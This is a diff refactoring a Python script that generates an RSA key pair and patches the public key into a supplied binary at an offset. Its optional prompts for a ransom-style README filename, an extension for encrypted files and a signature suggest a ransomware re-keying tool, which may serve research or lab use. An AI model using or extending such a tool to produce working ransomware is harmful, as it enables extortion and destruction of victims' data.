@@ -9,7 +9,7 @@ from struct import pack
 
 
 def gen_key_patch(file_patch, file_offset, private_key_file='private_key.pem',
-                  public_key_file='public_key.pem', advanced_flag=False):
+                  public_key_file='public_key.pem', advanced=False):
     print('Generating RSA key...')
     rsa_key = RSA.generate(1024, Random.new().read)  # generates key
     print('RSA key generated!')
@@ -27,11 +27,8 @@ def gen_key_patch(file_patch, file_offset, private_key_file='private_key.pem',
 
     # PATCHING FILE WITH PUBLIC KEY
     print('Patching provided file (%s) using offset (%s)...' % (file_patch, hex(file_offset)))
-    if advanced_flag:  # patching README filename  # TODO: confirm all of this works well, implement other features
-        # TODO: implement other features suck as changing file ext and version/goga tags
-
+    if advanced:  # patching README filename
         # README FILENAME
-        p_readme_filename_val = ''
         while True:
             p_readme_filename_val = input('Provide a README filename of 17 characters or less (enter to skip): ')
             if len(p_readme_filename_val) <= 17:
@@ -39,7 +36,6 @@ def gen_key_patch(file_patch, file_offset, private_key_file='private_key.pem',
             print('The provided filename is too large: %d characters.' % len(p_readme_filename_val))
 
         # ENCRYPTED FILE EXTENSION
-        p_encr_ext_val = ''
         while True:
             p_encr_ext_val = input('Provide an extension for encrypted files 6 characters or less (enter to skip): ')
             if len(p_encr_ext_val) <= 6:
@@ -47,7 +43,6 @@ def gen_key_patch(file_patch, file_offset, private_key_file='private_key.pem',
             print('The provided extension is too large: %d characters.' % len(p_encr_ext_val))
 
         # README FILE SIGNATURE
-        p_readme_signature_val = ''
         while True:
             p_readme_signature_val = input('Provide a signature of 48 characters or less (enter to skip): ')
             if len(p_readme_signature_val) <= 48:
@@ -89,7 +84,7 @@ def gen_key_patch(file_patch, file_offset, private_key_file='private_key.pem',
     print('New public key written to %s!' % public_key_file)
 
 
-if __name__ == '__main__':
+def main():
     parser = argparse.ArgumentParser(description='Accepts a minimum of a file to patch and file offset then generates '
                                                  'a binary patched with a newly generated public key.')
 
@@ -111,12 +106,15 @@ if __name__ == '__main__':
     in_file = args.in_file[0]
     offset = int(args.offset[0].replace('\u202c', ''), 0)  # unicode char is added to end requiring parse of last char
     # the previous line also parses the input as either hexadecimal or decimal
-    advanced_flag = args.advanced
+
     out_private = args.out_private[0] if args.out_private else 'private_key.pem'
     out_public = args.out_public[0] if args.out_public else 'public_key.pem'
 
-    gen_key_patch(in_file, offset, out_private, out_public, advanced_flag)
+    gen_key_patch(in_file, offset, out_private, out_public, args.advanced)
 
     print('Exiting!')
-    exit()
 
+
+if __name__ == '__main__':
+    main()
+    exit()
